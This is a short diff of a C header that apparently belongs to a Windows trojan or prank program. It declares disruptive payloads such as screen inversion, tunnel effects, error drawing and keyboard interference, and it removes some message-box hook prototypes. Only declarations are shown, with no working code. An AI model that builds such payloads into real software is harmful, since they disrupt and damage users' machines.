@@ -32,6 +32,9 @@ typedef struct {
 	#define PAYLOADHEAD
 #endif
 
+PAYLOADHOST(payloadHostDefault);
+PAYLOADHOST(payloadHostVisual);
+
 PAYLOADFUNCTIONDEFAULT(payloadExecute);
 PAYLOADFUNCTIONDEFAULT(payloadCursor);
 PAYLOADFUNCTIONVISUAL(payloadInvertScreen);
@@ -43,11 +46,6 @@ PAYLOADFUNCTIONDEFAULT(payloadKeyboard);
 PAYLOADFUNCTIONVISUAL(payloadTunnel);
 PAYLOADFUNCTIONVISUAL(payloadDrawErrors);
 PAYLOADHOST(payloadCrazyBus);
-
-// Helper functions
-DWORD WINAPI messageBoxThread(LPVOID);
-LRESULT CALLBACK msgBoxHook(int, WPARAM, LPARAM);
-BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
 
 #pragma once
 extern PAYLOAD payloads[];
